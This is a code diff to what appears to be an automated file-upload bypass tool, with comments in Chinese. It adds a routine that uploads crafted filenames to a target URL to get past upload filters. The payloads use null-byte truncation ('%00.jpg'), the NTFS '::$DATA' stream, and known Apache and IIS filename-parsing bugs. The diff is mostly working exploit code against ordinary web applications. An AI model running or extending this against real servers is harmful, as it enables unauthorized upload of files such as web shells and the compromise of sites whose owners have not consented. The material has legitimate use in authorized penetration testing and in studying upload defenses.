@@ -43,9 +43,8 @@ class General:
         p1 = self.mimeBypass()   # MIME绕过
         c1 = self.Comman.checkResult(self.initUrls, p1)
         self.end(check=c1, stop=self.stop)
-
         p2 = self.rareSuffixBypass()  # 同义后缀名绕过
-
+        p3 = self.truncatedBypass()  # 截断上传
         self.end(stop=True)
         return
 
@@ -80,6 +79,18 @@ class General:
             JSP.remove(suffix)
             return [filename.replace(suffix, x) for x in JSP]
         return []
+
+    def addTruncated(self, filename):
+        # 添加截断后缀
+        Truncated = ['%00.jpg', '::$DATA', '0x00.jpg', '/00.jpg']   # 尝试截断
+        apache = ['.xxx.yyy']      # apache解析漏洞
+        iis = [';.jpg']   # iis解析漏洞
+        fns = []
+        fns += [filename+x for x in Truncated]
+        fns += [filename+y for y in apache]
+        fns += [filename+z for z in iis]
+        return fns
+
 
     def mimeBypass(self, ct='image/jpg'):
         '''
@@ -117,6 +128,32 @@ class General:
         fns = self.fuzzRareSuffix(suffix, filename)
         if fns != []:
             print(blue('[ schedule ]') + cyan('利用不同的拓展名及文件名大小写混淆绕过'))
+            for f in fns:
+                print(blue('[ Info ]') + fuchsia('上传文件名:') + cyan(f))
+                files = self.setFiles(
+                    field=self.args.field,
+                    file=file,
+                    filename=f
+                )
+                res = self.Comman.upload(self.args.u, files, self.data)
+                check = self.Comman.checkResult(self.initUrls, res)
+                self.end(check=check, stop=self.stop)
+        return
+
+    def truncatedBypass(self):
+        '''
+        尝试以特殊字符截断、系统解析漏洞截断bypass
+        :return:
+        '''
+        if self.args.attach != '':  # 存在attach文件，获取后缀名备用
+            file = self.args.attach
+            filename = self.Comman.getFilename(self.args.attach)
+        else:
+            file = self.args.f
+            filename = self.Comman.getFilename(self.args.f)
+        fns = self.addTruncated(filename)
+        if fns != []:
+            print(blue('[ schedule ]') + cyan('尝试以特殊字符截断、系统解析漏洞截断bypass'))
             for f in fns:
                 print(blue('[ Info ]') + fuchsia('上传文件名:') + cyan(f))
                 files = self.setFiles(
